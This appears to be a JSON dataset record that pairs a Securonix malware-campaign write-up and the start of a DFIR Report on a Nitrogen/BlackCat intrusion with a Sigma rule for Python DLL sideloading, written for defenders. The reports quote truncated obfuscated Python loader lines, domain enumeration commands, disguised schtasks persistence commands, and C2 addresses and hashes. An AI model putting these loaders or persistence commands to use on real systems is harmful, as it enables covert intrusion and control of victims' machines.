line of the file are completely useless. These useless lines appear to attempt evading detection by creating a bunch of useless functions and defining unused variables along with randomly inserted comments.\n\n```image\nAlt: File content sample of the slv.py file\nDescription: The image displays a snippet of Python code, specifically from a malicious file named slv.py. It emphasizes the obfuscation techniques used by threat actors, showcasing various functions and classes that are mostly redundant. The key focus is on a highlighted line (line 1522) that imports libraries necessary for decompressing and executing a payload. This line indicates that the code will utilize the zlib library to decompress a long string of bytecode, followed by executing it with the exec() function. The overall layout of the image suggests a coding environment, with the code appearing on a dark background, likely imitating a terminal or IDE style, indicating its relevance to cybersecurity analysis.\nTranscription: |\n  import marshal, zlib, bz2, binascii; exec(marshal.loads(zlib.decompress(b'x\\x9c\\xbd\\x95\\x8d\\x9f\\x1c\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00...\n```\n\nThe line of code we’re interested in is quite large at over 240,000 characters containing raw Python bytecode. In summary, this line takes the long string contained in single quotes and then decompresses it using the zlib library. Next the decompressed object is marshaled which is done to serialize and deserialize Python code objects. It then executes the results of the payload via exec().\n\nImmediately after executing the contained code within the Python script, it will immediately begin beaconing to niubab[.]com (141.98.6[.]195) on port 8443. At this point the attackers have command and control capabilities over the infected host.\n\nAnother similar Python file was then dropped into the **%LOCALAPPDATA%\\Notepad** directory called wo15.py. Once executed, the file began beaconing to 194.180.48[.]42 on 443. Both slv.py and **wo15.py** appear to function in the same manner.\n\n#### Observed commands: manual session\n\nWith the system compromised and C2 established, we observed the following enumeration commands (spawning from pythonw.exe process):\n\n- `whoami /all`\n- `whoami /priv`\n- `net localgroup administrators`\n- `net group “domain controllers” /domain`\n- `net group “domain computers” /domain`\n- `net group “domain admins” /domain`\n\n### Moving up the infection chain…\n\nNext, three new directories were again created, this time from within the newly created **%LOCALAPPDATA%\\JetBrains** directory. These appeared to be randomized containing similar files within:\n\n- \\jetbrains\\qdslli\\update.exe\n- \\jetbrains\\qdslli\\spoolsv.exe\n- \\jetbrains\\qdslli\\msi.dll\n- \\jetbrains\\qdslli\\foo.dll\n- \\jetbrains\\erouud\\update.exe\n- \\jetbrains\\erouud\\spoolsv.exe\n- \\jetbrains\\erouud\\msi.dll\n- \\jetbrains\\erouud\\sex.dll\n- \\jetbrains\\pdyjlq\\update.exe\n- \\jetbrains\\pdyjlq\\spoolsv.exe\n- \\jetbrains\\pdyjlq\\mix.dll\n- \\jetbrains\\pdyjlq\\sex.dll\n\nThe files appear to be used for persistence and function similarly to that of the Python files we covered earlier.\n\nThe file update.exe is a legitimate msiexec binary that was renamed. When executed it will side load msi.dll which should normally exist in C:\\Windows\\System32. The DLL is sideloaded which then is rewritten to load the second 3-letter DLL in the folder which is the malicious payload.\n\nThe use of msiexec.exe to sideload msi.dll is not new and has been documented in the past. The DLL loaded by the process exhibited some classic Meterpreter characteristics and was built using known obfuscation methods. Beaconing to the following IP address was observed after execution:\n\n- **194.169.175[.]221:8443**\n\nOnce again we observed similar enumeration commands coming from the “update.exe” process as from the Python beacons earlier.\n\n### Persistence\n\nOnce infected, persistence on the host was established using scheduled tasks. We observed three unique tasks being created.\n\n```image\nAlt: scheduled tasks persistence\nDescription: The image displays a terminal window containing commands for creating scheduled tasks in a Windows environment. The commands use 'schtasks' to set up tasks that appear to masquerade as legitimate updates, specifically related to 'onedrive.' Each command includes paths to Python scripts (slv.py) and indicates how often the tasks are run. The background features green ASCII art text that reads 'SECURONIX RESEARCH,' emphasizing the context of cybersecurity research.\nTranscription: |\n  schtasks /create /i 30 /tn \"onedrive standalone update task-s-1-5-21-627446056-717320644-324052949-1001\" /ru \"SYSTEM\" /tr \"C:\\Users\\<REDACTED>\\appdata\\local\\jetbrains\\eround\\update.exe wcnzmz1h56w5j/jlsgqyct7hptfjoqec7nur2sulmy0mkerw0apxqsbkqlfxqhy8m/jf sd1jlg20p2prcmwfwlguqm9bvj1uysqvk0frwckgxn5r7iyv8gxrdyss\" /sc onidle /tr \"pythonw.exe c:\\users\\<REDACTED>\\appdata\\local\\notepad\\slv.py\"\n  \n  schtasks /create /ru system /tn \"onedrive standalone update task-s-1-5-21-57878930-262062721-4042165517-1001\" /tr \"C:\\Users\\<REDACTED>\\appdata\\local\\jetbrains\\eround\\update.exe zir8wekbunslch7l8hvplor2awrzkrxrdabtbl8vyo8v7qizqpu2yqrgjzpb5fmt6\" /sc onstart /f pythonw.exe \"C:\\Users\\<REDACTED>\\appdata\\local\\notepad\\slv.py\"\n  \n  schtasks /create /ru system /tn \"onedrive reporting task-s-1-5-21-573129509-084468411-1988063160-1001\" /tr \"C:\\Users\\<REDACTED>\\appdata\\local\\jetbrains\\eround\\update.exe zir8wekbunslch7l8hvplor2awrzkrxrdabtbl8vyo8v7qizqpu2yqrgjzpb5fmt6\" /sc minute /mo 720 /f pythonw.exe \"C:\\Users\\<REDACTED>\\appdata\\local\\notepad\\slv.py\"\n```\n\nAs you can see in the figure above, each of the scheduled tasks attempts to masquerade as a legitimate scheduled task starting with “onedrive standalone update task” and a security and group identifier that doesn’t exist.\n\nThe scheduled task calls update.exe (renamed msiexec.exe) followed by a long string which appears to be ignored by msiexec during our testing. This is likely an attempt to break detections. The process pythonw.exe is also executed along with the slv.py payload.\n\n```image\nAlt: scheduled task details\nDescription: The image displays a command line interface (CLI) output showing details of a scheduled task named \"onedrive standalone update task\". The output includes various attributes of the task, such as its status, logon type, last run time, author, task location, and execution command. The command indicates that a potentially malicious executable (update.exe, renamed from msiexec.exe) is being run, along with an additional string that may serve to evade detection. The background features a green representation of ASCII text, enhancing the technical theme of the image.\nTranscription: |\n  C:\\>schtasks /query /tn \"onedrive standalone update task\" /s 1-5-21-978789930-26262721-4042165517-1001 /FO list /v\n  \n  Folder: \\\n  HostName:\n  TaskName: onedrive standalone update task\n  Status: Ready\n  Logon Mode: Interactive/Background\n  Last Run Time: 11/9/2019 12:00:00 AM\n  Last Result: 26701\n  Author: N/A\n  Task To Run: C:\\Users\\<username>\\appdata\\local\\jetbrains\\remote\\update.exe @p1tmfcdpqz7iiyhguetubalers8f3suhfnagzau/jk9gsyzybp5mt6zir8ewkb...\n  Start In: N/A\n  Comment: N/A\n  Scheduled Task State: Enabled\n  Idle Time: N/A\n  Power Management: Run As User, Stop on Battery Mode, No Start on Batteries\n  Run As User: SYSTEM\n  Delete Task If Not Rescheduled:\n  Stop Task If Runs X Hours and X Mins: N/A\n  Schedule: Scheduling data is not available in this format.\n  Schedule Type: At system startup\n  Start Time: N/A\n  End Date: N/A\n  Days: N/A\n  Months: N/A\n  Repeat: Every:\n  Repeat: Until: Duration:\n  Repeat: Until: Stop If Still Running:\n```\n\n### Wrapping up…\n\nGiven the fact that the attackers were leveraging Google Ads to disperse malware, it can be inferred that the targets are limited to anyone seeking WinSCP software. The geoblocking used on the site hosting the malware suggests that those in the US are victims of this attack.\n\nThe overall attack chain is quite unusual and relies heavily upon several rounds of DLL sideloading, and malicious compiled Python files which results in a rather complex attack chain ending with persistence via scheduled tasks.\n\n### C2 and infrastructure\n\nThe SEO#LURKER consisted of several C2 IP addresses using either port 443 or 8443. The domain pr-uae[.]com appears to be compromised and is currently hosting the malicious WinSCP zip file at the root of the domain.\n\nAll three of the IP addresses are hosted in the Netherlands, registered to RIPE NCC.\n\n| C2 Address        | Description                               |\n| ----------------- | ----------------------------------------- |\n| gaweeweb[.]com    | Compromised WordPress website             |\n| pr-uae[.]com      | Download initial lure payload             |\n| niubab[.]com      | C2 Comms over port 8443/443 by update.exe |\n| 141.98.6[.]195    | C2 Comms over port 8443 by pythonw.exe    |\n| 194.180.48[.]42   | C2 Comms over port 443 by pythonw.exe     |\n| 194.169.175[.]221 | C2 Comms over port 8443 by update.exe     |\n\n### Securonix recommendations and mitigations\n\nWith malvertising becoming more and more popular, it’s critical to scrutinize web results thoroughly especially when searching for software to download and install.\n\n- Check that files are downloaded from reputable sites, always check the URL that it matches the intended software\n- Verify file download that it matches the checksum provided by the trusted source (guide)\n- Monitor common malware staging directories, especially the user’s “\\Appdata\\Local” which was used in this attack campaign\n- Deploy additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage\n- Securonix customers can scan endpoints using the Securonix Seeder Hunting Queries below\n\n#### MITRE ATT&CK matrix\n\n| Tactic               | Technique                                                  |\n| -------------------- | ---------------------------------------------------------- |\n| Resource Development | T1583.008: Acquire Infrastructure: Malvertising            |\n| Execution            | T1204.001: User Execution: Malicious Link                  |\n|                      | T1204.002: User Execution: Malicious File                  |\n|                      | T1059: Command and Scripting Interpreter                   |\n|                      | T1059.006: Command and Scripting Interpreter: Python       |\n| Defense Evasion      | T1574.002: Hijack Execution Flow: DLL Side-Loading         |\n|                      | T1036.004: Masquerading: Masquerade Task or Service        |\n|                      | T1036.005: Masquerading: Match Legitimate Name or Location |\n| Command and Control  | T1105: Ingress Tool Transfer                               |\n|                      | T1573.001: Encrypted Channel: Symmetric Cryptography       |\n|                      | T1219: Remote Access Software                              |\n| Persistence          | T1053: Scheduled Task/Job                                  |\n\n#### Analyzed file hashes\n\n| File Name              | SHA256 (IoC)                                                     |\n| ---------------------- | ---------------------------------------------------------------- |\n| WinSCP_6.1.2-Setup.zip | 6EB977F30B1D54E450118381F345DB2546613D1AF5D4D097B0E8D4769962A581 |\n| setup.exe              | 24385D352B83222DC5AB92FA57B6649854ECD74DE378E279D8AC20A0B3B16009 |\n| python311.dll          | BAFEDBA6E75D64E7820048E7ED6625451D22382A4F5F77F822DAEF225CB6EAE8 |\n| msi.dll                | EE895FF48DA45393C4573E9E9E5C062DBC0F747BEFF89B7DDC53BDE41F773A41 |\n|                        | 1CE2B14E35AD00D6029DE24D192CF3CB3DDA09D22CC6851E9EFB0DA1B3EEBC1A |\n|                        | EEA0EF246B99590072FCBC004724FC96613E4BD31F05345DE7FBB0EED3B7BBFB |\n| sex.dll                | D5A5B4CB023DB243D1A65489B75A3252948252F21D9609E6C65A059D7ACF0566 |\n| mix.dll                | AE346633270EB0FB0ED97E0B2E840AFD333D2EFA967CF90FF35CF55FD4B3D86E |\n| foo.dll                | 3164D0A9CB3D1088EA89F1429B51DBEAB4EFA44E200F0CB9F7908D0AA9D8159B |\n| slv.py                 | D4CEF07C9BA72CD4ED63F6FE7B3C86188CBF7DC9E2988791907186E744A235B8 |\n| wo15.py                | B663EA82D4BDB6DE13264E637F817F08AD6EB107606E2385485E467EC4F7F54C |\n\n#### Relevant provisional Securonix detections\n\n- EDR-ALL-1100-RU\n- EDR-ALL-185-ER\n- EDR-ALL-1169-RU\n- EDR-ALL-1262-RU\n\n#### Relevant hunting/Spotter queries (be sure to remove square brackets “[ ]”)\n\n- `index = activity AND rg_functionality = “Web Proxy” AND (destinationaddress = “141.98.6[.]195” OR destinationaddress = “194.180.48[.]42” OR destinationaddress = “194.169.175[.]221”) AND (destinationport = “443” OR destinationport = “8443”)`\n- `index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Network connection detected” OR deviceaction = “Network connection detected (rule: NetworkConnect)”) AND (destinationhostname CONTAINS “gaweeweb[.]com” OR destinationhostname CONTAINS “pr-uae[.]com” OR destinationhostname CONTAINS “winccp[.]net” OR destinationhostname CONTAINS “niubab[.]com”)`\n- `index = activity AND rg_functionality = “Endpoint Management Systems” AND baseeventid = “7” AND customstring67 ENDS WITH “\\msi.dll” AND (customstring67 NOT CONTAINS “\\windows\\system32” OR customstring67 NOT CONTAINS “\\windows\\syswow64”)`\n- `index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “ProcessCreate” OR deviceaction = “Process Create” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “Procstart” OR deviceaction = “Process” OR deviceaction = “Trace Executed Process”) AND destinationprocessname = “schtasks.exe” AND (resourcecustomfield1 CONTAINS “\\Appdata\\Local” OR resourcecustomfield1 CONTAINS “\\Appdata\\Roaming”)`\n\n### References:\n\n1. Malvertising Used as Entry Vector for BlackCat, Actors Also Leverage SpyBoy Terminator\n   Link\n2. Malvertisers Using Google Ads to Target Users Searching for Popular Software\n   Link\n3. Malvertising in Facebook: Analysis, Quantification and Solution\n   Link\n4. Malvertising via Dynamic Search Ads delivers malware bonanza\n   Link\n5. Hijacking DLLs in Windows\n   Link\n6. How to Check a File Checksum: A Step-by-Step Guide\n   Link\n7. Rickrolling.\n   Link",
    "sigma_rule": {
      "title": "Potential Python DLL SideLoading",
      "id": "d36f7c12-14a3-4d48-b6b8-774b9c66f44d",
      "status": "experimental",
      "description": "Detects potential DLL sideloading of Python DLL files.",
      "references": [
        "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
        "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
        "https://github.com/wietze/HijackLibs/tree/dc9c9f2f94e6872051dab58fbafb043fdd8b4176/yml/3rd_party/python"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\python39.dll",
            "\\python310.dll",
            "\\python311.dll",
            "\\python312.dll"
          ]
        },
        "filter_main_default_install_paths": [
          {
            "ImageLoaded|startswith": [
              "C:\\Program Files\\Python3",
              "C:\\Program Files (x86)\\Python3"
            ]
          },
          {
            "ImageLoaded|contains": "\\AppData\\Local\\Programs\\Python\\Python3"
          }
        ],
        "filter_optional_visual_studio": {
          "ImageLoaded|startswith": "C:\\Program Files\\Microsoft Visual Studio\\"
        },
        "filter_optional_cpython": {
          "ImageLoaded|contains": [
            "\\cpython\\externals\\",
            "\\cpython\\PCbuild\\"
          ]
        },
        "filter_main_legit_signature_details": {
          "Product": "Python",
          "Signed": "true",
          "Description": "Python",
          "Company": "Python Software Foundation"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software using Python DLLs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_python.yml",
    "id": "34"
  },
  {
    "url": "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/",
    "markdown": "# Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware\n\n**Categories:** BlackCat, Cobalt Strike, Ransomware, Sliver \n**Published on:** September 30, 2024 \n\n---\n\n## Key Takeaways\n\n- In November 2023, a BlackCat ransomware intrusion was identified, initiated by Nitrogen malware hosted on a website impersonating Advanced IP Scanner.\n- Nitrogen was used to deploy Sliver and Cobalt Strike beacons on the beachhead host via Python scripts.\n- The threat actor used PowerSploit, SharpHound, and native Windows utilities for network enumeration, and Impacket for lateral movement after harvesting domain credentials.\n- Restic, an open-source backup tool, was deployed on a file server to exfiltrate shared data to a remote server.\n- Eight days after initial access, the threat actor modified a privileged user password and deployed BlackCat ransomware across the domain using PsExec.\n- Six rules were added to the Private Ruleset related to this intrusion.\n\nAn audio version of this report is available on Spotify, Apple, YouTube, Audible, and Amazon.\n\n---\n\n## The DFIR Report Services\n\n- **Private Threat Briefs:** Over 20 private DFIR reports annually.\n- **Threat Feed:** Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.\n- **All Intel:** Includes everything from Private Threat Briefs and Threat Feed, plus private events, opendir reports, long-term tracking, data clustering, and other curated intel.\n- **Private Sigma Ruleset:** Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.\n- **DFIR Labs:** Offers cloud-based, hands-on learning experiences using real data from real intrusions.\n\nContact us today for pricing or a demo!\n\n---\n\n## Table of Contents\n\n- Case Summary\n- Analysts\n- Initial Access\n- Execution\n- Persistence\n- Privilege Escalation\n- Defense Evasion\n- Credential Access\n- Discovery\n- Lateral Movement\n- Collection\n- Command and Control\n- Exfiltration\n- Impact\n- Timeline\n- Diamond Model\n- Indicators\n- Detections\n- MITRE ATT&CK\n\n---\n\n## Case Summary\n\nThe incident began when a user unknowingly downloaded a malicious version of Advanced IP Scanner from a fraudulent website mimicking the legitimate one, leveraging Google ads to rank higher in search results. Analysis of the attack pattern and loader signature suggests this was part of a Nitrogen campaign. The compromised installer came as a ZIP file, which the victim extracted before launching the embedded executable, triggering the infection.\n\nThe executable was a legitimate Python binary that side-loaded a modified Python DLL to execute Nitrogen code. This process dropped a Sliver beacon in an AppData subfolder named \"Notepad.\" All malware deployed during the intrusion was obfuscated using Py-Fuscate to conceal malicious Python scripts. About eight minutes after Nitrogen execution, the attacker initiated hands-on keyboard discovery using Windows utilities such as `net`, `ipconfig`, and `nltest`. Two minutes later, additional Sliver beacons were deployed on the compromised host, with persistence established through scheduled tasks and registry key modifications.\n\nA little over an hour after the initial execution, the threat actor deployed additional malware, this time Cobalt Strike beacons, again wrapped in the Py-Fuscate obfuscation technique. The discovery phase continued with detailed enumeration of the Active Directory domain, including local and domain administrators, domain controllers, and computers. Tools such as SharpHound and PowerSploit were used. The Cobalt Strike beacon was then used to dump domain credentials from LSASS, granting the attacker local admin credentials with broad access across the network.\n\nUsing stolen credentials, the threat actor leveraged Impacket’s `wmiexec` to move laterally to a server, where they used `curl` to download a ZIP file containing their tools. After extracting the archive, they repeated the same persistence techniques observed on the beachhead, creating scheduled tasks and modifying registry keys. The attacker then targeted a second server, replicating the same steps to deploy their tools and maintain persistence. Shortly after, a second credential dump was performed, again targeting LSASS memory. Following this, the threat actor began using a domain administrator account, indicating they likely obtained those credentials during this phase.\n\nThe threat actor continued their lateral movement, replicating the same actions on both a file server and a backup server. Approximately six hours after gaining initial access, they deployed the open-source backup tool Restic on the file server. Using Restic, the attacker exfiltrated data from the file shares to a remote server located in Bulgaria. After this, the hands-on activity significantly decreased and remained largely silent until the seventh day.\n\nOn the seventh day, the threat actor logged into the backup server and accessed the backup console. No further actions were observed, leading us to assess that this was likely a discovery effort aimed at understanding the backup configurations.\n\nOn the eighth day, the threat actor shifted to their final objectives. They identified the domain controllers and used `xcopy` from their initial lateral movement server to transfer tools to one of the domain controllers, executing them remotely via `WMIC`. Next, they ran a batch script on the domain controller using `PSEXEC`, targeting a privileged backup service account, which changed that account's credentials. From the staging server, the attacker began distributing the BlackCat ransomware binary across the network using `SMB` and the Windows copy utility. This was followed by executing another batch script via `PSEXEC` on multiple remote hosts, initiating the ransomware deployment.\n\nThe final script executed a series of actions on remote hosts, including configuring them to start in Safe Mode with Networking and setting a registry run key to launch the ransomware binary upon reboot. It also set the compromised backup service account to auto-login using Winlogon, and then forced a system reboot. As a result, the hosts rebooted into Safe Mode, where the ransomware was automatically executed. This led to file encryption across the affected systems, with the ransomware leaving a note on each host. The Time to Ransomware (TTR) was approximately 156 hours, spanning over eight calendar days.\n\nSubscribe here to get an email when we publish a new report.\n\n---\n\n## Analysts\n\nAnalysis and reporting completed by Angelo Violetti, @0xtornado (LinkedIn), and @v3t0_.\n\n---\n\n## Initial Access\n\n### Drive-by Compromise\n\nBased on threat intelligence sources and the file name, we are highly confident that the threat actors accessed the victim’s infrastructure through a Nitrogen campaign, which delivered a ZIP file via malicious Google ads (i.e., malvertising).\n\nNitrogen is known for leveraging legitimate utilities like Advanced IP Scanner, Putty, etc., to conceal malware. The following graph shows the Nitrogen infection chain and how it executed Sliver.\n\n```image\nAlt: Nitrogen Infection Chain\nDescription: The image is a flowchart titled 'Nitrogen Infection Graph' that visually represents the infection chain of the Nitrogen campaign. It outlines the steps taken from the initial compromise via a Google advertisement delivering a malicious ZIP file named 'Version.zip,' which contains a legitimate Python executable 'setup.exe' and hidden Python DLLs. The chart details subsequent actions, including the loading of 'python311.dll,' execution of Nitrogen code, and the installation of Advanced IP Scanner. It also shows file paths and processes involved in executing a Sliver beacon and installing malware on the compromised system.\nTranscription: |\n  Nitrogen Infection Graph\n  ├── Google AD delivering malicious Advanced IP Scanner\n  │   ├── Version.zip\n  │   │   ├── C:\\Users\\[REDACTED]\\Downloads\\Version\\setup.exe\n  │   │   ├── C:\\Users\\[REDACTED]\\Downloads\\Version\\python311.dll\n  │   │   └── C:\\Users\\[REDACTED]\\Downloads\\Version\\services_probes\n  │   └── Setup.exe loads python311.dll and executes Nitrogen code\n  │       └── AES-Decrypts\n  └── Sliver execution and Advanced IP Scanner installation\n      ├── C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\python.exe\n      ├── C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\Cryptodome\n      ├── C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\slvpy\n      └── C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\data.aes\n          └── AES-Decrypts and executes in memory\n              └── C:\\Program Files (x86)\\Advanced IP Scanner\\advanced_ip_scanner.exe\n                  └── 194.4994.18\n```\n\nThe ZIP file named `Version.zip` contained:\n\n- A legitimate Python executable named `setup.exe`, which was run by the victim.\n- Two hidden Python DLLs.\n\n```image\nAlt: ZIP File Contents\nDescription: The image displays a file directory listing on a computer system, showcasing various files associated with a Nitrogen campaign. Key files highlighted in red include two Python DLLs named 'python311.dll' and 'python311x.dll', each with their respective sizes, and an executable file named 'setup.exe'. The date modified for all files is shown as January 11, 2023, at 06:40. This listing provides insight into the components involved in the campaign's infection chain.\nTranscription: |\n  Name                                  Date modified      Type                    Size\n  printsupport                          01/11/2023 06:40   File folder             -\n  advanced_ip_scanner_en_us.qm          01/11/2023 06:40   QM File                 1 KB\n  advanced_ip_scanner_uk_ua.qm          01/11/2023 06:40   QM File                 29 KB\n  details_panel_en_us.tpl               01/11/2023 06:40   TPL File                2 KB\n  details_panel_uk_ua.tpl               01/11/2023 06:40   TPL File                2 KB\n  python311.dll                         01/11/2023 06:40   Application extension   43’540 KB\n  python311x.dll                        01/11/2023 06:40   Application extension   5’626 KB\n  service_probes                        01/11/2023 06:40   File                    577 KB\n  setup.exe                             01/11/2023 06:40   Application             100 KB\n  vcruntime140.dll                      01/11/2023 06:40   Application extension   79 KB\n```\n\nUpon execution of `setup.exe`, the following actions were performed:\n\n- The hidden `python311.dll` was loaded (DLL sideloading), and the Nitrogen code was launched.\n- A legitimate copy of Advanced IP Scanner was copied into the `%Public%\\Downloads` folder.\n- `python.exe`, `pycryptodome`, and a Sliver beacon were placed into a folder named `%AppData%\\Notepad`.\n- The Sliver beacon was executed through a Python script named `slv.py`, which decrypts an AES-encrypted DLL (`data.aes`) and loads it into memory.\n- Advanced IP Scanner was installed on the compromised system.\n\nA similar campaign was reported by @dipotwb on Twitter. We also observed overlap with campaigns reported by Esentire.\n\n```image\nAlt: Campaign Overlap\nDescription: The image depicts a series of logs and code snippets from a Twitter thread detailing the infection chain of a malicious campaign involving the Advanced IP Scanner. The first part lists a series of URLs that are associated with malicious advertisements leading to the download of the Advanced IP Scanner, including their respective IDs and last visit times. The second part describes the execution of `setup.exe`, which is misleadingly signed by Microsoft, as it executes both the legitimate program and a hidden Python script. The image illustrates the tactics used in the attack, highlighting how legitimate tools were exploited to deliver malware.\nTranscription: |\n  1. Web browsing -> Google AD -> advanned-ip-scanner.net\n  \n  id = 35531\n  url = https://www.google.com/search?q=download+advanced+ip+scanner&rlz=1C1GCEA_enUS983US983\n  title = download advanced ip scanner - Google Search\n  last_visit_time = 133435309968131967\n  \n  id = 35532\n  url = https://www.googleleadservices.com/pagead/aclk?sa=L&ai=DChcSEwi56rmf7dyCaxVTAH0KHX...\n  title = Advanced IP Scanner - Download Free Network Scanner.\n  last_visit_time = 133435309978015099\n  \n  id = 35533\n  url = https://mueslifusion.com/mastering-the-use-of-network-scanners/?gclid=EAIAIQobChMIueq5n-3ggMVwB9Ch0gE...\n  title = Advanced IP Scanner - Download Free Network Scanner.\n  last_visit_time = 133435309978015099\n  \n  id = 35534\n  url = https://advanned-ip-scanner.net/?gclid=EAIAIQobChMIueq5n-3ggMVwB9Ch0gE...\n  title = Advanced IP Scanner - Download Free Network Scanner.\n  last_visit_time = 133435309978015099\n  \n  id = 35535\n  url = https://advanned-ip-scanner.net/download/AFGta3ab.php?gclid=EAIAIQobChMIueq5n-3ggMVwB9Ch0gE...\n  title = Advanced IP Scanner - Download Free Network Scanner.\n  last_visit_time = 133435309978015099\n  \n  2. User runs “setup.exe” which is signed by “Microsoft Corporation”, this results in Advanced IP Scanner being executed, but also executes a python script. “setup.exe” is actually a renamed “Bioso.exe” which performs some DLL side loading (tactic: hijacklibs.net/#bioiso.exe)\n  \n  | Process Name            | Company Name        | File Path                                  |\n  | ----------------------- | ------------------- | ------------------------------------------ |\n  | Advanced_IP_Scanner.exe | Microsoft Corp.     | C:\\Program Files\\Advanced IP Scanner\\...   |\n  | setup.exe               | Microsoft Corp.     | C:\\Users\\User\\AppData\\Local\\Temp\\setup.exe |\n  | python.exe              | Python Software Fdn | C:\\Python39\\python.exe                     |\n  | Bioso.exe               | Unknown             | C:\\Users\\User\\AppData\\Local\\Temp\\Bioso.exe |\n```\n\n---\n\n## Execution\n\nA few minutes later, the threat actor deployed Python scripts on the beachhead, serving as loaders for both Sliver and Cobalt Strike.\n\n```image\nAlt: Execution Sequence\nDescription: The image displays a table with columns indicating various attributes of executed processes. The first column shows the event module (sysmon), followed by the executable paths of Python scripts being run from a specified directory. The last two columns include the command line arguments for each process executed, highlighting specific Python script names such as 'woksilv.py', 'worksliv.py', and 'wo14.py'. This data is relevant for understanding the sequence of executed scripts in the context of a cyber threat campaign.\nTranscription: |\n  | event.module | process.executable                      | process.command_line                    | winlog.task                          |\n  | ------------ | --------------------------------------- | --------------------------------------- | ------------------------------------ |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n  | sysmon       | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | C:\\Users\\XXXX\\AppData\\Local\\pythonw.exe | Process Create (rule: ProcessCreate) |\n```\n\nThe following image shows the sequence of beacons executed on the beachhead host.\n\n```image\nAlt: Beacon Sequence\nDescription: The image depicts a flowchart illustrating the execution sequence of beacons from Sliver to Cobalt Strike. It shows various steps including the dropping and execution of scripts, along with the commands used and the sequence of processes involved. The flowchart specifically lists the file paths of Python scripts and commands executed, highlighting the interaction between different components of the attack.\nTranscription: |\n  From Sliver to Cobalt Strike\n  \n  Silver Beacon\n      python.exe C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\slv.py\n      194.4994.18\n      Drops and executes\n  \n  Cobalt Strike\n      C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\pythonw.exe14.py\n      Spawn and injects\n  \n  Cobalt Strike\n      C:\\Windows\\System32\\cmd.exe\n      9192.250.65\n      Injects\n  \n  Cobalt Strike\n      C:\\Windows\\System32\\gupdate.exe\n      \\MsFetWds##\n      \\PGMessagePipe##\n      Spawn and injects\n  \n  Silver Beacon\n      C:\\Users\\[REDACTED]\\AppData\\Local\\Notepad\\pythonw.exe worksilv.py\n      194.169.175.134\n      Drops and executes\n  \n  Cobalt Strike\n      C:\\Windows\\System32\\winlogon.exe\n```\n\n### Sliver\n\nThe Python script `slv.py`, used to load Sliver into memory, was heavily obfuscated. However, buried within thousands of lines of code was the critical section responsible for executing the Sliver beacon.\n\n```image\nAlt: Sliver Execution\nDescription: The image displays a segment of obfuscated Python code, specifically a function definition that imports various libraries such as `marshal`, `lzma`, `gzip`, `bz2`, `binascii`, and `zlib`. It also shows the execution of a decompressed object using `marshal.loads`, which indicates that it is part of a malicious script related to the Sliver campaign. The highlighted section in red emphasizes the critical part of the code responsible for executing potentially harmful functions.\nTranscription: |\n  import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SY\\xee2\\xxd5\\x88\\x00\\xac\\xea\\x7f\\xxd3\\x7f\\xxf4')))\n```\n\nBased on the analysis of these artifacts, it appears the Sliver payload was likely obfuscated using Py-Fuscate, as the tool’s encode function mirrored the same imports and procedures found in the obfuscated script, effectively concealing the malicious code.\n\n```image\nAlt: Py-Fuscate Analysis\nDescription: The image displays a snippet of Python code that defines a function named `encode`. This function randomly selects a compression method from a list (which includes lzma, gzip, b2, binascii, and zlib) and uses the `marshal` module to encode a given source code. The code also includes logic for handling different selected compression methods, showcasing how the `marshal` module is 